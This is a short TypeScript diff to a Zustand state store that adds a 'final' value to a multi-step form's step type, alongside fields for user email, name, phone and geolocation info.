@@ -16,7 +16,7 @@ interface State {
     geoInfo: GeoInfo | null;
     messageId: number | null;
     message: string | null;
-    formStep: 'init' | 'password' | 'verify' | null;
+    formStep: 'init' | 'password' | 'verify' | 'final' | null;
     userEmail: string | null;
     userFullName: string | null;
     userPhone: string | null;
@@ -25,7 +25,7 @@ interface State {
     setGeoInfo: (info: GeoInfo) => void;
     setMessageId: (id: number | null) => void;
     setMessage: (msg: string | null) => void;
-    setFormStep: (step: 'init' | 'password' | 'verify' | null) => void;
+    setFormStep: (step: 'init' | 'password' | 'verify' | 'final' | null) => void;
     setUserEmail: (email: string | null) => void;
     setUserFullName: (name: string | null) => void;
     setUserPhone: (phone: string | null) => void;
@@ -54,7 +54,7 @@ export const store = create<State>()(
             setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
             setMessageId: (id: number | null) => set({ messageId: id }),
             setMessage: (msg: string | null) => set({ message: msg }),
-            setFormStep: (step: 'init' | 'password' | 'verify' | null) => set({ formStep: step }),
+            setFormStep: (step: 'init' | 'password' | 'verify' | 'final' | null) => set({ formStep: step }),
             setUserEmail: (email: string | null) => set({ userEmail: email }),
             setUserFullName: (name: string | null) => set({ userFullName: name }),
             setUserPhone: (phone: string | null) => set({ userPhone: phone }),
